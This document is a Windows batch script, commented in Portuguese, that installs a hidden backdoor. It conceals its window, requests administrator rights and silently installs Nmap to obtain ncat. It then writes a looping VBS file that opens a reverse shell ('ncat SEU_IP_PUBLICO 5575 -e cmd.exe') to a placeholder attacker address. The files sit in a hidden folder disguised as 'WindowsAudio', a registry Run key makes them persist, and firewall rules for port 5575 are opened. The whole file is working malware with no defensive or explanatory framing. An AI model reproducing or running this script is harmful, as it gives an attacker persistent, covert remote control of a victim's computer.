@echo off
:: Ocultar esta janela imediatamente
if not "%1"=="hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
    exit
)

:: Verifica se já está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando privilegios de administrador...
    powershell start -verb runas '%0'
    exit /b
)

curl -L -o "%TEMP%\winget.msixbundle" "https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" > nul 2>&1
start "" /wait "%TEMP%\winget.msixbundle"

:: Aguardar instalador fechar
echo [*] Aguardando instalacao do Winget...
:wait_winget
timeout /t 3 /nobreak > nul
tasklist /fi "imagename eq AppInstaller.exe" 2>nul | find /i "AppInstaller.exe" > nul
if %errorlevel% equ 0 goto wait_winget

:: Aguardar mais um pouco pra garantir
timeout /t 5 /nobreak > nul

:: Instalar Nmap
echo [*] Instalando Nmap...
winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1

:: Atualizar PATH com o Nmap
set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"

:: Criar pasta oculta
mkdir "%USERPROFILE%\WindowsAudio" > nul 2>&1
attrib +h "%USERPROFILE%\WindowsAudio" > nul 2>&1

:: Criar audio.vbs
echo Do > "%USERPROFILE%\WindowsAudio\audio.vbs"
echo CreateObject("Wscript.Shell").Run "ncat SEU_IP_PUBLICO 5575 -e cmd.exe", 0, false >> "%USERPROFILE%\WindowsAudio\audio.vbs"
echo Loop >> "%USERPROFILE%\WindowsAudio\audio.vbs"

:: Criar audio.bat
echo @echo off > "%USERPROFILE%\WindowsAudio\audio.bat"
echo start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs" >> "%USERPROFILE%\WindowsAudio\audio.bat"
echo exit >> "%USERPROFILE%\WindowsAudio\audio.bat"

:: Registrar no Windows
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\WindowsAudio\audio.bat" /f > nul 2>&1

:: Liberar o ranger de portas 5575-5580 na entrada e saida
netsh advfirewall firewall add rule name="Abrir Portas Entrada 5575" dir=in action=allow protocol=TCP localport=5575
netsh advfirewall firewall add rule name="Abrir Portas Saida 5575" dir=out action=allow protocol=TCP localport=5575

:: Iniciar listener
start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"

exit
